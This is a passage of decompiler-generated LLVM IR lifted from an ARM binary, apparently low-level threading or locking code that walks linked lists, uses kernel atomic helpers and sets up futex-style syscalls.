  store i32 %v4_139b0, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_139b4 = icmp eq i32 %v4_139b0, 0
  br i1 %v2_139b4, label %dec_label_pc_139bc, label %dec_label_pc_138e0

dec_label_pc_13900:                               ; preds = %dec_label_pc_138e0
  %v0_13900 = load i32, i32* %r8.global-to-local, align 4
  %v1_13900 = load i32, i32* %r5.global-to-local, align 4
  %v2_13900 = add i32 %v1_13900, %v0_13900
  %v3_13900 = inttoptr i32 %v2_13900 to i32*
  %v4_13900 = load i32, i32* %v3_13900, align 4
  %v1_13904 = add i32 %v4_13900, 20
  store i32 %v1_13904, i32* %r2.global-to-local, align 4
  %v1_13908132 = inttoptr i32 %v1_13904 to i32*
  %v2_13908133 = load i32, i32* %v1_13908132, align 4
  store i32 %v2_13908133, i32* %r3.global-to-local, align 4
  %v3_1390c135 = icmp uge i32 %v2_13908133, %v3_138ec
  store i1 %v3_1390c135, i1* %cpsr_c.global-to-local, align 1
  %v9_1390c141 = icmp eq i32 %v2_13908133, %v3_138ec
  br i1 %v9_1390c141, label %dec_label_pc_13914, label %dec_label_pc_1392c

dec_label_pc_13914:                               ; preds = %dec_label_pc_13900, %dec_label_pc_13914.dec_label_pc_13908_crit_edge
  %v0_13914142 = phi i32 [ %v1_1390c.pre, %dec_label_pc_13914.dec_label_pc_13908_crit_edge ], [ %v3_138ec, %dec_label_pc_13900 ]
  store i32 %v0_13914142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13924 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13924, label %dec_label_pc_13928, label %dec_label_pc_13914.dec_label_pc_13908_crit_edge

dec_label_pc_13914.dec_label_pc_13908_crit_edge:  ; preds = %dec_label_pc_13914
  %v0_13908.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1390c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13908 = inttoptr i32 %v0_13908.pre to i32*
  %v2_13908 = load i32, i32* %v1_13908, align 4
  store i32 %v2_13908, i32* %r3.global-to-local, align 4
  %v3_1390c = icmp uge i32 %v2_13908, %v1_1390c.pre
  store i1 %v3_1390c, i1* %cpsr_c.global-to-local, align 1
  %v9_1390c = icmp eq i32 %v2_13908, %v1_1390c.pre
  br i1 %v9_1390c, label %dec_label_pc_13914, label %dec_label_pc_1392c

dec_label_pc_13928:                               ; preds = %dec_label_pc_13914
  %v0_13928 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13928, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1392c

dec_label_pc_1392c:                               ; preds = %dec_label_pc_13900, %dec_label_pc_13914.dec_label_pc_13908_crit_edge, %dec_label_pc_13928
  %v0_1392c = phi i32 [ %v0_13928, %dec_label_pc_13928 ], [ %v2_13908133, %dec_label_pc_13900 ], [ %v2_13908, %dec_label_pc_13914.dec_label_pc_13908_crit_edge ]
  %v1_1392c = phi i32 [ %v0_13928, %dec_label_pc_13928 ], [ %v3_138ec, %dec_label_pc_13900 ], [ %v1_1390c.pre, %dec_label_pc_13914.dec_label_pc_13908_crit_edge ]
  %v3_1392c = icmp uge i32 %v0_1392c, %v1_1392c
  store i1 %v3_1392c, i1* %cpsr_c.global-to-local, align 1
  %v9_1392c = icmp eq i32 %v0_1392c, %v1_1392c
  br i1 %v9_1392c, label %dec_label_pc_13934, label %dec_label_pc_139b0.backedge

dec_label_pc_13934:                               ; preds = %dec_label_pc_1392c
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_13948 = ptrtoint i32* %stack_var_-88 to i32
  br label %dec_label_pc_13938

dec_label_pc_13938:                               ; preds = %dec_label_pc_139a0, %dec_label_pc_13934
  %v0_13938 = load i32, i32* %r7.global-to-local, align 4
  %v1_13938 = add i32 %v0_13938, 4
  %v2_13938 = inttoptr i32 %v1_13938 to i32*
  %v3_13938 = load i32, i32* %v2_13938, align 4
  store i32 %v3_13938, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1393c = icmp eq i32 %v3_13938, 0
  br i1 %v2_1393c, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_13938
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_13938, %bb
  %v2_13944 = xor i1 %v2_1393c, true
  call void @__pseudo_cond_branch(i1 %v2_13944, i32 %v3_13938)
  %v0_1394c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1394c, i32* %stack_var_-88, align 4
  %v1_13950 = inttoptr i32 %v0_1394c to i32*
  %v2_13950 = load i32, i32* %v1_13950, align 4
  store i32 %v2_13950, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13954 = icmp eq i32 %v2_13950, 0
  store i32 %v2_13948, i32* %r5.global-to-local, align 4
  br i1 %v2_13954, label %dec_label_pc_139c0.loopexit, label %dec_label_pc_13968

dec_label_pc_13968:                               ; preds = %bb72
  %v1_13968 = add i32 %v2_13950, 20
  store i32 %v1_13968, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1396c

dec_label_pc_1396c:                               ; preds = %dec_label_pc_139a0.dec_label_pc_1396c_crit_edge, %dec_label_pc_13968
  %v0_13970 = phi i32 [ %v0_13970.pre, %dec_label_pc_139a0.dec_label_pc_1396c_crit_edge ], [ %v1_13968, %dec_label_pc_13968 ]
  %v0_1396c = phi i32 [ %v0_1396c.pre, %dec_label_pc_139a0.dec_label_pc_1396c_crit_edge ], [ %v2_13950, %dec_label_pc_13968 ]
  %v1_1396c = add i32 %v0_1396c, 20
  %v2_1396c = inttoptr i32 %v1_1396c to i32*
  %v3_1396c = load i32, i32* %v2_1396c, align 4
  store i32 %v0_13970, i32* %r2.global-to-local, align 4
  store i32 %v3_1396c, i32* %r4.global-to-local, align 4
  %v1_1397c119 = inttoptr i32 %v0_13970 to i32*
  %v2_1397c120 = load i32, i32* %v1_1397c119, align 4
  store i32 %v2_1397c120, i32* %r3.global-to-local, align 4
  %v3_13980122 = icmp uge i32 %v2_1397c120, %v3_1396c
  store i1 %v3_13980122, i1* %cpsr_c.global-to-local, align 1
  %v9_13980128 = icmp eq i32 %v2_1397c120, %v3_1396c
  br i1 %v9_13980128, label %dec_label_pc_13988, label %dec_label_pc_139a0

dec_label_pc_13988:                               ; preds = %dec_label_pc_1396c, %dec_label_pc_13988.dec_label_pc_1397c_crit_edge
  %v0_13988129 = phi i32 [ %v1_13980.pre, %dec_label_pc_13988.dec_label_pc_1397c_crit_edge ], [ %v3_1396c, %dec_label_pc_1396c ]
  store i32 %v0_13988129, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13998 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13998, label %dec_label_pc_1399c, label %dec_label_pc_13988.dec_label_pc_1397c_crit_edge

dec_label_pc_13988.dec_label_pc_1397c_crit_edge:  ; preds = %dec_label_pc_13988
  %v0_1397c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13980.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1397c = inttoptr i32 %v0_1397c.pre to i32*
  %v2_1397c = load i32, i32* %v1_1397c, align 4
  store i32 %v2_1397c, i32* %r3.global-to-local, align 4
  %v3_13980 = icmp uge i32 %v2_1397c, %v1_13980.pre
  store i1 %v3_13980, i1* %cpsr_c.global-to-local, align 1
  %v9_13980 = icmp eq i32 %v2_1397c, %v1_13980.pre
  br i1 %v9_13980, label %dec_label_pc_13988, label %dec_label_pc_139a0

dec_label_pc_1399c:                               ; preds = %dec_label_pc_13988
  %v0_1399c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1399c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_139a0

dec_label_pc_139a0:                               ; preds = %dec_label_pc_1396c, %dec_label_pc_13988.dec_label_pc_1397c_crit_edge, %dec_label_pc_1399c
  %v0_139a0 = phi i32 [ %v0_1399c, %dec_label_pc_1399c ], [ %v2_1397c120, %dec_label_pc_1396c ], [ %v2_1397c, %dec_label_pc_13988.dec_label_pc_1397c_crit_edge ]
  %v1_139a0 = phi i32 [ %v0_1399c, %dec_label_pc_1399c ], [ %v3_1396c, %dec_label_pc_1396c ], [ %v1_13980.pre, %dec_label_pc_13988.dec_label_pc_1397c_crit_edge ]
  %v3_139a0 = icmp uge i32 %v0_139a0, %v1_139a0
  store i1 %v3_139a0, i1* %cpsr_c.global-to-local, align 1
  %v9_139a0 = icmp eq i32 %v0_139a0, %v1_139a0
  store i32 %v2_13948, i32* %r4.global-to-local, align 4
  br i1 %v9_139a0, label %dec_label_pc_13938, label %dec_label_pc_139a0.dec_label_pc_1396c_crit_edge

dec_label_pc_139a0.dec_label_pc_1396c_crit_edge:  ; preds = %dec_label_pc_139a0
  %v0_1396c.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_13970.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1396c

dec_label_pc_139bc:                               ; preds = %dec_label_pc_139b0.backedge, %entry
  %v0_139c431 = phi i32 [ ptrtoint (i32* @global_var_21694.308 to i32), %entry ], [ %v0_139b0, %dec_label_pc_139b0.backedge ]
  store i32 0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_139c0

dec_label_pc_139c0.loopexit:                      ; preds = %bb72
  store i32 %v2_13948, i32* %r6.global-to-local, align 4
  %v0_139c4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_139c0

dec_label_pc_139c0:                               ; preds = %dec_label_pc_139c0.loopexit, %dec_label_pc_139bc
  %v0_139c4 = phi i32 [ %v0_139c4.pre, %dec_label_pc_139c0.loopexit ], [ %v0_139c431, %dec_label_pc_139bc ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_139c4 = add i32 %v0_139c4, 152
  %v3_139c4 = inttoptr i32 %v2_139c4 to i32*
  %v4_139c4 = load i32, i32* %v3_139c4, align 4
  store i32 %v4_139c4, i32* %r7.global-to-local, align 4
  %v0_139c8 = call i32 @__aeabi_read_tp()
  store i32 %v0_139c8, i32* %r0.global-to-local, align 4
  %v1_139cc = add i32 %v4_139c4, 8
  %v2_139cc = inttoptr i32 %v1_139cc to i32*
  %v3_139cc = load i32, i32* %v2_139cc, align 4
  store i32 %v3_139cc, i32* %r3.global-to-local, align 4
  %v1_139d0 = add i32 %v0_139c8, -1168
  store i32 %v1_139d0, i32* %r5.global-to-local, align 4
  %v3_139d4 = icmp uge i32 %v3_139cc, %v1_139d0
  store i1 %v3_139d4, i1* %cpsr_c.global-to-local, align 1
  %v9_139d4 = icmp eq i32 %v3_139cc, %v1_139d0
  br i1 %v9_139d4, label %dec_label_pc_13b3c, label %dec_label_pc_139dc

dec_label_pc_139dc:                               ; preds = %dec_label_pc_139c0
  store i32 %v4_139c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_139e8112 = inttoptr i32 %v4_139c4 to i32*
  %v2_139e8113 = load i32, i32* %v1_139e8112, align 4
  store i32 %v2_139e8113, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_139ec115 = icmp eq i32 %v2_139e8113, 0
  br i1 %v9_139ec115, label %dec_label_pc_139f4, label %dec_label_pc_13a0c

dec_label_pc_139f4:                               ; preds = %dec_label_pc_139dc, %dec_label_pc_139f4.dec_label_pc_139e8_crit_edge
  %v0_139f4116 = phi i32 [ %v1_139ec.pre, %dec_label_pc_139f4.dec_label_pc_139e8_crit_edge ], [ 0, %dec_label_pc_139dc ]
  store i32 %v0_139f4116, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13a04 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13a04, label %dec_label_pc_13a08, label %dec_label_pc_139f4.dec_label_pc_139e8_crit_edge

dec_label_pc_139f4.dec_label_pc_139e8_crit_edge:  ; preds = %dec_label_pc_139f4
  %v0_139e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_139ec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_139e8 = inttoptr i32 %v0_139e8.pre to i32*
  %v2_139e8 = load i32, i32* %v1_139e8, align 4
  store i32 %v2_139e8, i32* %r3.global-to-local, align 4
  %v3_139ec = icmp uge i32 %v2_139e8, %v1_139ec.pre
  store i1 %v3_139ec, i1* %cpsr_c.global-to-local, align 1
  %v9_139ec = icmp eq i32 %v2_139e8, %v1_139ec.pre
  br i1 %v9_139ec, label %dec_label_pc_139f4, label %dec_label_pc_13a0c

dec_label_pc_13a08:                               ; preds = %dec_label_pc_139f4
  %v0_13a08 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13a08, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13a0c

dec_label_pc_13a0c:                               ; preds = %dec_label_pc_139dc, %dec_label_pc_139f4.dec_label_pc_139e8_crit_edge, %dec_label_pc_13a08
  %v0_13a0c = phi i32 [ %v0_13a08, %dec_label_pc_13a08 ], [ %v2_139e8113, %dec_label_pc_139dc ], [ %v2_139e8, %dec_label_pc_139f4.dec_label_pc_139e8_crit_edge ]
  %v1_13a0c = phi i32 [ %v0_13a08, %dec_label_pc_13a08 ], [ 0, %dec_label_pc_139dc ], [ %v1_139ec.pre, %dec_label_pc_139f4.dec_label_pc_139e8_crit_edge ]
  %v3_13a0c = icmp uge i32 %v0_13a0c, %v1_13a0c
  store i1 %v3_13a0c, i1* %cpsr_c.global-to-local, align 1
  %v9_13a0c = icmp eq i32 %v0_13a0c, %v1_13a0c
  br i1 %v9_13a0c, label %bb74, label %bb73

bb73:                                             ; preds = %dec_label_pc_13a0c
  %v1_13a10 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_13a10, i32* %r0.global-to-local, align 4
  br label %bb74

bb74:                                             ; preds = %dec_label_pc_13a0c, %bb73
  %v1_13a14 = xor i1 %v9_13a0c, true
  call void @__pseudo_cond_branch(i1 %v1_13a14, i32 ptrtoint (i32* @global_var_13c8c.468 to i32))
  %v0_13a18 = load i32, i32* %r5.global-to-local, align 4
  %v1_13a18 = load i32, i32* %r7.global-to-local, align 4
  %v2_13a18 = add i32 %v1_13a18, 8
  %v3_13a18 = inttoptr i32 %v2_13a18 to i32*
  store i32 %v0_13a18, i32* %v3_13a18, align 4
  br label %dec_label_pc_13b3c

dec_label_pc_13b3c:                               ; preds = %bb74, %dec_label_pc_139c0
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_13a20 = load i32, i32* %r8.global-to-local, align 4
  %v2_13a20 = add i32 %v0_13a20, 152
  %v3_13a20 = inttoptr i32 %v2_13a20 to i32*
  %v4_13a20 = load i32, i32* %v3_13a20, align 4
  store i32 %v4_13a20, i32* %r2.global-to-local, align 4
  %v1_13a24 = add i32 %v4_13a20, 4
  %v2_13a24 = inttoptr i32 %v1_13a24 to i32*
  %v3_13a24 = load i32, i32* %v2_13a24, align 4
  %v1_13a28 = add i32 %v3_13a24, 1
  store i32 %v1_13a28, i32* %r3.global-to-local, align 4
  store i32 %v1_13a28, i32* %v2_13a24, align 4
  %v0_13a30 = load i32, i32* %r5.global-to-local, align 4
  %v1_13a30 = add i32 %v0_13a30, 108
  %v2_13a30 = inttoptr i32 %v1_13a30 to i32*
  %v3_13a30 = load i32, i32* %v2_13a30, align 4
  store i32 %v3_13a30, i32* %sl.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  %v1_13a38 = sub i32 0, %v3_13a30
  store i32 %v1_13a38, i32* %v2_13a30, align 4
  store i32 18874385, i32* %r0.global-to-local, align 4
  %v0_13a4c = load i32, i32* %r5.global-to-local, align 4
  %v1_13a4c = add i32 %v0_13a4c, 104
  store i32 %v1_13a4c, i32* %r4.global-to-local, align 4
  store i32 120, i32* %r7.global-to-local, align 4
  store i32 18874385, i32* %r2.global-to-local, align 4
  store i32 18874385, i32* %sb.global-to-local, align 4
  %v0_13b40.pre = load i32, i32* %sl.global-to-local, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_13b40 = add i32 %v0_13a4c, 108
  %v3_13b40 = inttoptr i32 %v2_13b40 to i32*
  store i32 %v0_13b40.pre, i32* %v3_13b40, align 4
  %v0_13b44 = load i32, i32* %r8.global-to-local, align 4
  %v1_13b44 = load i32, i32* %r3.global-to-local, align 4
  %v2_13b44 = add i32 %v1_13b44, %v0_13b44
  %v3_13b44 = inttoptr i32 %v2_13b44 to i32*
  %v4_13b44 = load i32, i32* %v3_13b44, align 4
  store i32 %v4_13b44, i32* %r0.global-to-local, align 4
  %v1_13b48 = add i32 %v4_13b44, 4
  %v2_13b48 = inttoptr i32 %v1_13b48 to i32*
  %v3_13b48 = load i32, i32* %v2_13b48, align 4
  %v1_13b4c = add i32 %v3_13b48, -1
  store i32 %v1_13b4c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13b50 = icmp eq i32 %v1_13b4c, 0
  store i32 %v1_13b4c, i32* %v2_13b48, align 4
  br i1 %v2_13b50, label %dec_label_pc_13b5c, label %dec_label_pc_13c4cthread-pre-split

dec_label_pc_13b5c:                               ; preds = %dec_label_pc_13b3c
  %v0_13b5c = load i32, i32* %r3.global-to-local, align 4
  %v1_13b5c = load i32, i32* %r0.global-to-local, align 4
  %v2_13b5c = add i32 %v1_13b5c, 8
  %v3_13b5c = inttoptr i32 %v2_13b5c to i32*
  store i32 %v0_13b5c, i32* %v3_13b5c, align 4
  %v0_13b60 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13b60, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13b64

dec_label_pc_13b64:                               ; preds = %dec_label_pc_13b94.dec_label_pc_13b64_crit_edge, %dec_label_pc_13b5c
  %v0_13b64 = phi i32 [ %v0_13b64.pre, %dec_label_pc_13b94.dec_label_pc_13b64_crit_edge ], [ %v0_13b60, %dec_label_pc_13b5c ]
  %v1_13b64 = inttoptr i32 %v0_13b64 to i32*
  %v2_13b64 = load i32, i32* %v1_13b64, align 4
  store i32 %v2_13b64, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_13b64, i32* %r2.global-to-local, align 4
  %v2_13b70100 = load i32, i32* %v1_13b64, align 4
  store i32 %v2_13b70100, i32* %r3.global-to-local, align 4
  %v3_13b74102 = icmp uge i32 %v2_13b70100, %v2_13b64
  store i1 %v3_13b74102, i1* %cpsr_c.global-to-local, align 1
  %v9_13b74108 = icmp eq i32 %v2_13b70100, %v2_13b64
  br i1 %v9_13b74108, label %dec_label_pc_13b7c, label %dec_label_pc_13b94

dec_label_pc_13b7c:                               ; preds = %dec_label_pc_13b64, %dec_label_pc_13b7c.dec_label_pc_13b70_crit_edge
  %v0_13b7c109 = phi i32 [ %v1_13b74.pre, %dec_label_pc_13b7c.dec_label_pc_13b70_crit_edge ], [ %v2_13b64, %dec_label_pc_13b64 ]
  store i32 %v0_13b7c109, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13b8c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13b8c, label %dec_label_pc_13b90, label %dec_label_pc_13b7c.dec_label_pc_13b70_crit_edge

dec_label_pc_13b7c.dec_label_pc_13b70_crit_edge:  ; preds = %dec_label_pc_13b7c
  %v0_13b70.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13b74.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13b70 = inttoptr i32 %v0_13b70.pre to i32*
  %v2_13b70 = load i32, i32* %v1_13b70, align 4
  store i32 %v2_13b70, i32* %r3.global-to-local, align 4
  %v3_13b74 = icmp uge i32 %v2_13b70, %v1_13b74.pre
  store i1 %v3_13b74, i1* %cpsr_c.global-to-local, align 1
  %v9_13b74 = icmp eq i32 %v2_13b70, %v1_13b74.pre
  br i1 %v9_13b74, label %dec_label_pc_13b7c, label %dec_label_pc_13b94

dec_label_pc_13b90:                               ; preds = %dec_label_pc_13b7c
  %v0_13b90 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13b90, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13b94

dec_label_pc_13b94:                               ; preds = %dec_label_pc_13b64, %dec_label_pc_13b7c.dec_label_pc_13b70_crit_edge, %dec_label_pc_13b90
  %v0_13b9c = phi i32 [ %v0_13b90, %dec_label_pc_13b90 ], [ %v2_13b70100, %dec_label_pc_13b64 ], [ %v2_13b70, %dec_label_pc_13b7c.dec_label_pc_13b70_crit_edge ]
  %v1_13b94 = phi i32 [ %v0_13b90, %dec_label_pc_13b90 ], [ %v2_13b64, %dec_label_pc_13b64 ], [ %v1_13b74.pre, %dec_label_pc_13b7c.dec_label_pc_13b70_crit_edge ]
  %v3_13b94 = icmp uge i32 %v0_13b9c, %v1_13b94
  store i1 %v3_13b94, i1* %cpsr_c.global-to-local, align 1
  %v9_13b94 = icmp eq i32 %v0_13b9c, %v1_13b94
  br i1 %v9_13b94, label %dec_label_pc_13b9c, label %dec_label_pc_13b94.dec_label_pc_13b64_crit_edge

dec_label_pc_13b94.dec_label_pc_13b64_crit_edge:  ; preds = %dec_label_pc_13b94
  %v0_13b64.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_13b64

dec_label_pc_13b9c:                               ; preds = %dec_label_pc_13b94
  %v2_13b9c = icmp ne i32 %v1_13b94, 0
  store i1 %v2_13b9c, i1* %cpsr_c.global-to-local, align 1
  %v7_13ba0 = icmp slt i32 %v1_13b94, 2
  br i1 %v7_13ba0, label %dec_label_pc_13c4cthread-pre-split, label %dec_label_pc_13ba4

dec_label_pc_13ba4:                               ; preds = %dec_label_pc_13b9c
  %v0_13ba4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13ba4, i32* %r0.global-to-local, align 4
  %v0_13ba8 = load i32, i32* @r1, align 4
  %v1_13ba8 = add i32 %v0_13ba8, 129
  store i32 %v1_13ba8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13c4cthread-pre-split

dec_label_pc_13bc0:                               ; preds = %dec_label_pc_13c4cthread-pre-split, %dec_label_pc_13c48
  %v0_13bc0 = phi i32 [ %v3_13c48, %dec_label_pc_13c48 ], [ %v0_13c4c.pr, %dec_label_pc_13c4cthread-pre-split ]
  %v1_13bc0 = inttoptr i32 %v0_13bc0 to i32*
  %v2_13bc0 = load i32, i32* %v1_13bc0, align 4
  store i32 %v2_13bc0, i32* %r3.global-to-local, align 4
  %v1_13bc4 = add i32 %v2_13bc0, 8
  %v2_13bc4 = inttoptr i32 %v1_13bc4 to i32*
  %v3_13bc4 = load i32, i32* %v2_13bc4, align 4
  store i32 %v3_13bc4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13bc8 = icmp eq i32 %v3_13bc4, 0
  br i1 %v2_13bc8, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_13bc0
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_13bc0, %bb75
  %v2_13bd0 = xor i1 %v2_13bc8, true
  call void @__pseudo_cond_branch(i1 %v2_13bd0, i32 %v3_13bc4)
  %v0_13bd4 = load i32, i32* %r6.global-to-local, align 4
  %v1_13bd4 = inttoptr i32 %v0_13bd4 to i32*
  %v2_13bd4 = load i32, i32* %v1_13bd4, align 4
  store i32 %v2_13bd4, i32* %r5.global-to-local, align 4
  %v1_13bd8 = add i32 %v2_13bd4, 20
  store i32 %v1_13bd8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13bdc

dec_label_pc_13bdc:                               ; preds = %dec_label_pc_13c10.dec_label_pc_13bdc_crit_edge, %bb76
  %v0_13be0 = phi i32 [ %v0_13be0.pre, %dec_label_pc_13c10.dec_label_pc_13bdc_crit_edge ], [ %v1_13bd8, %bb76 ]
  %v0_13bdc = phi i32 [ %v0_13bdc.pre, %dec_label_pc_13c10.dec_label_pc_13bdc_crit_edge ], [ %v2_13bd4, %bb76 ]
  %v1_13bdc = add i32 %v0_13bdc, 20
  %v2_13bdc = inttoptr i32 %v1_13bdc to i32*
  %v3_13bdc = load i32, i32* %v2_13bdc, align 4
  store i32 %v0_13be0, i32* %r2.global-to-local, align 4
  store i32 %v3_13bdc, i32* %r4.global-to-local, align 4
  %v1_13be8 = add i32 %v3_13bdc, -1
  store i32 %v1_13be8, i32* @r1, align 4
  %v1_13bec87 = inttoptr i32 %v0_13be0 to i32*
  %v2_13bec88 = load i32, i32* %v1_13bec87, align 4
  store i32 %v2_13bec88, i32* %r3.global-to-local, align 4
  %v3_13bf090 = icmp uge i32 %v2_13bec88, %v3_13bdc
  store i1 %v3_13bf090, i1* %cpsr_c.global-to-local, align 1
  %v9_13bf096 = icmp eq i32 %v2_13bec88, %v3_13bdc
  br i1 %v9_13bf096, label %dec_label_pc_13bf8, label %dec_label_pc_13c10

dec_label_pc_13bf8:                               ; preds = %dec_label_pc_13bdc, %dec_label_pc_13bf8.dec_label_pc_13bec_crit_edge
  %v0_13bf897 = phi i32 [ %v1_13bf0.pre, %dec_label_pc_13bf8.dec_label_pc_13bec_crit_edge ], [ %v3_13bdc, %dec_label_pc_13bdc ]
  store i32 %v0_13bf897, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13c08 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13c08, label %dec_label_pc_13c0c, label %dec_label_pc_13bf8.dec_label_pc_13bec_crit_edge

dec_label_pc_13bf8.dec_label_pc_13bec_crit_edge:  ; preds = %dec_label_pc_13bf8
  %v0_13bec.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_13bf0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13bec = inttoptr i32 %v0_13bec.pre to i32*
  %v2_13bec = load i32, i32* %v1_13bec, align 4
  store i32 %v2_13bec, i32* %r3.global-to-local, align 4
  %v3_13bf0 = icmp uge i32 %v2_13bec, %v1_13bf0.pre
  store i1 %v3_13bf0, i1* %cpsr_c.global-to-local, align 1
  %v9_13bf0 = icmp eq i32 %v2_13bec, %v1_13bf0.pre
  br i1 %v9_13bf0, label %dec_label_pc_13bf8, label %dec_label_pc_13c10

dec_label_pc_13c0c:                               ; preds = %dec_label_pc_13bf8
  %v0_13c0c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13c0c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13bdc, %dec_label_pc_13bf8.dec_label_pc_13bec_crit_edge, %dec_label_pc_13c0c
  %v0_13c1c = phi i32 [ %v0_13c0c, %dec_label_pc_13c0c ], [ %v2_13bec88, %dec_label_pc_13bdc ], [ %v2_13bec, %dec_label_pc_13bf8.dec_label_pc_13bec_crit_edge ]
  %v1_13c10 = phi i32 [ %v0_13c0c, %dec_label_pc_13c0c ], [ %v3_13bdc, %dec_label_pc_13bdc ], [ %v1_13bf0.pre, %dec_label_pc_13bf8.dec_label_pc_13bec_crit_edge ]
  %v3_13c10 = icmp uge i32 %v0_13c1c, %v1_13c10
  store i1 %v3_13c10, i1* %cpsr_c.global-to-local, align 1
  %v9_13c10 = icmp eq i32 %v0_13c1c, %v1_13c10
  store i32 %v0_13c1c, i32* %r2.global-to-local, align 4
  br i1 %v9_13c10, label %dec_label_pc_13c1c, label %dec_label_pc_13c10.dec_label_pc_13bdc_crit_edge

dec_label_pc_13c10.dec_label_pc_13bdc_crit_edge:  ; preds = %dec_label_pc_13c10
  %v0_13bdc.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_13be0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13bdc

dec_label_pc_13c1c:                               ; preds = %dec_label_pc_13c10
  %v2_13c1c = icmp ne i32 %v1_13c10, 0
  store i1 %v2_13c1c, i1* %cpsr_c.global-to-local, align 1
  %v7_13c1c = icmp eq i32 %v1_13c10, 1
  %v0_13c24 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v7_13c1c, label %dec_label_pc_13c24, label %dec_label_pc_13c48

dec_label_pc_13c24:                               ; preds = %dec_label_pc_13c1c
  %v1_13c24 = inttoptr i32 %v0_13c24 to i32*
  %v2_13c24 = load i32, i32* %v1_13c24, align 4
  store i32 %v2_13c24, i32* @r1, align 4
  %v1_13c28 = add i32 %v2_13c24, 24
  %v2_13c28 = inttoptr i32 %v1_13c28 to i32*
  %v3_13c28 = load i32, i32* %v2_13c28, align 4
  store i32 %v3_13c28, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c2c = icmp eq i32 %v3_13c28, 0
  br i1 %v2_13c2c, label %dec_label_pc_13c48, label %dec_label_pc_13c34

dec_label_pc_13c34:                               ; preds = %dec_label_pc_13c24
  %v1_13c34 = add i32 %v2_13c24, 20
  %v2_13c34 = inttoptr i32 %v1_13c34 to i32*
  %v3_13c34 = load i32, i32* %v2_13c34, align 4
  store i32 %v3_13c34, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 129, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13c48

dec_label_pc_13c48:                               ; preds = %dec_label_pc_13c1c, %dec_label_pc_13c34, %dec_label_pc_13c24
